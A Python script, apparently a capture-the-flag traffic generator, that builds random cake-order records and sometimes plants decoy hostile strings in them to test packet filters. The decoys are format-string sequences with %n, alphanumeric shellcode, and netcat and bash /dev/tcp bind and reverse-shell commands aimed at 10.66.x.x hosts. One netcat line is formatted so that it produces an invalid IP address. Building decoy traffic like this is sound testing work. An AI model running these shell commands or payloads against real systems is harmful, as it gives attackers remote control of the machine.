import random
import os
import base64
from pwn import *

FLAVORS = ["Spicy Chocolate Cake", "Chocolate", "Vanilla", "Red Velvet", "Lemon", "Carrot", "Strawberry", "Coffee", "Coconut", "Marble", "Funfetti", "Pistachio", "Banana", "Almond", "Matcha", "Cookies and Cream", "Black Forest"]
TOPPINGS = ["ganache", "buttercream", "whippedcream", "fondant", "strawberries", "blueberries", "raspberries", "coconut", "caramel", "sprinkles", "nuts", "candies", "flowers", "sugar", "cookies", "cherries"]
CUSTOMTXT = ["Congratulations", "Happy Birthday", "Best Wishes", "Good Luck", "Forever Love", "Thank You", "Bon Voyage", "Just Married", "Sweet Sixteen", "Happy Anniversary", "Welcome Home", "You Did It", "Get Well Soon", "We Love You", "Cheers", "Happy Retirement"]
COMMENTS = ["Please write neatly with pink icing", "Add extra sprinkles on top", "Make it gluten free if possible", "Use dark chocolate frosting", "Add candles for 10 years", "Include a small heart design", "Keep it simple and elegant", "Use dairy free whipped cream", "Please deliver before noon", "Add gold shimmer dust", "Write message in cursive", "Use strawberries for garnish", "Make it extra moist and fluffy"]


TABLE_NAMES = ["ORDERS", "USERS"]

class CakeOrder:
    def __init__(self):
        self.size = random.choice("sml")
        self.flavor = random.choice(FLAVORS)
        self.toppings = ", ".join(random.choices(TOPPINGS, k=random.choice(range(4))))
        self.customtxt = random.choice(CUSTOMTXT)
        self.comment = random.choice(COMMENTS)
        evil = random.randint(0,3)
        if evil & 1:
            self.flavor = generate_message()[:64]
        if evil & 2:
            self.comment = generate_message()[:64]

    def __str__(self):
        return f"CakeOrder('{self.size}', '{self.flavor}', '{self.toppings}', '{self.customtxt}', '{self.comment}')"
    
    def use_flag(self, flag):
        self.flavor = flag

def get_random_ip():
    return "fd66:666:{:x}:ffff::{:x}".format(random.randint(0,4096), random.randint(0,255))

def rand_fmt():
    offset = lambda: random.choice(["", f"{random.randint(4, 128)}$"])
    width = lambda: random.choice(["", str(random.randint(24, 65535))])
    length = lambda: random.choice(["hh", "h", "l", "ll", "z", ""])
    conversion = lambda: random.choice(["n", "d", "x", "c", "s", ""])

    return ''.join(["%{}{}{}{}".format(offset(), width(), length(), conversion()) for i in range(random.randint(4, 16))])


def generate_message():
    "returns a string that hopefully triggers some packet filtering"

    return random.choice([
        os.urandom(random.randint(4, 128)).hex(),
	base64.b64encode(os.urandom(random.randint(4, 128))).decode(),
  	cyclic(random.randint(4, 16)).decode(),
        r"TX-3399-Purr-!TTTP\%JONE%501:-%mm4-%mm%--DW%P-Yf1Y-fwfY-yzSzP-iii%-Zkx%-%Fw%P-XXn6- 99w%-ptt%P-%w%%-qqqq-jPiXP-cccc-Dw0D-WICzP-c66c-W0TmP-TTTT-%NN0-%o42-7a-0P-xGGx-rrrx- aFOwP-pApA-N-w--B2H2PPPPPPPPPPPPPPPPPPPPPP",
	'Never gonna give you up, never gonna let you down',
      	'/bin/sh -c "/bin/{} -l -p {} -e /bin/sh"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535)),
	'/bin/sh -c "/bin/{} -e /bin/sh 10.66.{}.{} {}"'.format(random.choice(['nc', 'ncat', 'netcat']), random.randint(1024, 65535), random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
	'/bin/bash -i >& /dev/tcp/10.66.{}.{}/{} 0>&1'.format(random.randint(0,255), random.randint(0,255), random.randint(1024, 65535)),
    ])

